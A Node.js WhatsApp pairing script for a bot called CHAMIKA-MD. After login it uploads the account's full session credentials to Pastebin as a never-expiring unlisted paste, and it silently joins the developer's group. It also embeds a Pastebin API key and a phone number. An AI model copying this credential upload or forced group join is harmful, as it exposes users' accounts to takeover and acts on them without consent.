const PastebinAPI = require('pastebin-js'),
pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL')
const {makeid} = require('./id')
const id = makeid()
const fs = require('fs')
const pino = require('pino')
const { default: makeWASocket, Browsers, delay, useMultiFileAuthState, BufferJSON, fetchLatestBaileysVersion, PHONENUMBER_MCC, DisconnectReason, makeInMemoryStore, jidNormalizedUser, makeCacheableSignalKeyStore } = require("@whiskeysockets/baileys")
const Pino = require("pino")
const NodeCache = require("node-cache")
const chalk = require("chalk")
const readline = require("readline")
const { parsePhoneNumber } = require("libphonenumber-js")


let phoneNumber = "94766632281"

const pairingCode = !!phoneNumber || process.argv.includes("--pairing-code")
const useMobile = process.argv.includes("--mobile")

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))


  async function qr() {
//------------------------------------------------------
let { version, isLatest } = await fetchLatestBaileysVersion()
const {  state, saveCreds } =await useMultiFileAuthState('./session/'+id)
    const msgRetryCounterCache = new NodeCache() // for retry message, "waiting message"
    const XeonBotInc = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: !pairingCode, // popping up QR in terminal log
      browser: Browsers.windows('Firefox'), // for this issues https://github.com/WhiskeySockets/Baileys/issues/328
     auth: {
         creds: state.creds,
         keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: "fatal" }).child({ level: "fatal" })),
      },
      markOnlineOnConnect: true, // set false for offline
      generateHighQualityLinkPreview: true, // make high preview link
      getMessage: async (key) => {
         let jid = jidNormalizedUser(key.remoteJid)
         let msg = await store.loadMessage(jid, key.id)

         return msg?.message || ""
      },
      msgRetryCounterCache, // Resolve waiting messages
      defaultQueryTimeoutMs: undefined, // for this issues https://github.com/WhiskeySockets/Baileys/issues/276
   })


    // login use pairing code
   // source code https://github.com/WhiskeySockets/Baileys/blob/master/Example/example.ts#L61
   if (pairingCode && !XeonBotInc.authState.creds.registered) {
      if (useMobile) throw new Error('Cannot use pairing code with mobile api')

      let phoneNumber
      if (!!phoneNumber) {
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Start with country code of your WhatsApp Number, Example : +916909137213")))
            process.exit(0)
         }
      } else {
         phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Please type your WhatsApp number ✅\nFor example: 94766632281 : `)))
         phoneNumber = phoneNumber.replace(/[^0-9]/g, '')

         // Ask again when entering the wrong number
         if (!Object.keys(PHONENUMBER_MCC).some(v => phoneNumber.startsWith(v))) {
            console.log(chalk.bgBlack(chalk.redBright("Start with country code of your WhatsApp Number, Example : 94766632281")))

            phoneNumber = await question(chalk.bgBlack(chalk.greenBright(`Please type your WhatsApp number ✅\nFor example: 94766632281 : `)))
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '')
            rl.close()
         }
      }

      setTimeout(async () => {
         let code = await XeonBotInc.requestPairingCode(phoneNumber)
         code = code?.match(/.{1,4}/g)?.join("-") || code
         console.log(chalk.black(chalk.bgGreen(`Your Pairing Code : `)), chalk.black(chalk.white(code)))
      }, 3000)
   }
//------------------------------------------------------
    XeonBotInc.ev.on("connection.update",async  (s) => {
        const { connection, lastDisconnect } = s
        if (connection == "open") {
            await delay(1000 * 10)
            await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*🪀Cᴏɴᴛᴀᴄᴛ Dᴇᴠᴇʀʟᴏᴘᴇʀ*\n\n\n*ᴡʜᴀᴛꜱᴀᴘᴘ :*\nhttps://wa.me/+94766632281\n\n*ᴛᴇʟᴇɢʀᴀᴍ :*\nhttps://t.me/MrIzuruX\n\n❘❘⦁──────────────⦁❘❘\n\n*Join Our Public Bot Group :*\n> *https://chat.whatsapp.com/Ko2HfqBt5mjEsmV9fY7Bsq*\n\n*THANKS FOR USING _CHAMIKA-MD_ 🤠*` });
            await delay(1000 * 2) 
             const output = await pastebin.createPasteFromFile(__dirname+`/session/${id}/creds.json`, "pastebin-js test", null, 1, "N")
					const xeonses = await XeonBotInc.sendMessage(XeonBotInc.user.id, {
						text: `dgxeon-` + output.split('/')[3]
					})
               XeonBotInc.groupAcceptInvite("https://chat.whatsapp.com/Ko2HfqBt5mjEsmV9fY7Bsq");
             await XeonBotInc.sendMessage(XeonBotInc.user.id, { text: `*Tʜɪꜱ Iꜱ Yᴏᴜʀ SESSION_ID ✅*\n\n*⚠️ DO NOT SHARE ANYONE THIS CODE ⚠*\n\n     *⦁ 𝚃𝙷𝙰𝙽𝙺𝚂 𝙵𝙾𝚁 𝚄𝚂𝙸𝙽𝙶 𝙼𝚁 𝙸𝚂𝚄𝚁𝚄 𝙿𝙰𝙸𝚁-𝙲𝙾𝙳𝙴*\n\n*々 ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʏʙᴇʀᴋɪʟʟᴇʀꜱᴛᴇᴀᴍ*` }, {quoted: xeonses});
              await delay(1000 * 2) 
              process.exit(0)
        }
        if (
            connection === "close" &&
            lastDisconnect &&
            lastDisconnect.error &&
            lastDisconnect.error.output.statusCode != 401
        ) {
            qr()
        }
    })
    XeonBotInc.ev.on('creds.update', saveCreds)
    XeonBotInc.ev.on("messages.upsert",  () => { })
}
qr()

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("not-authorized")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
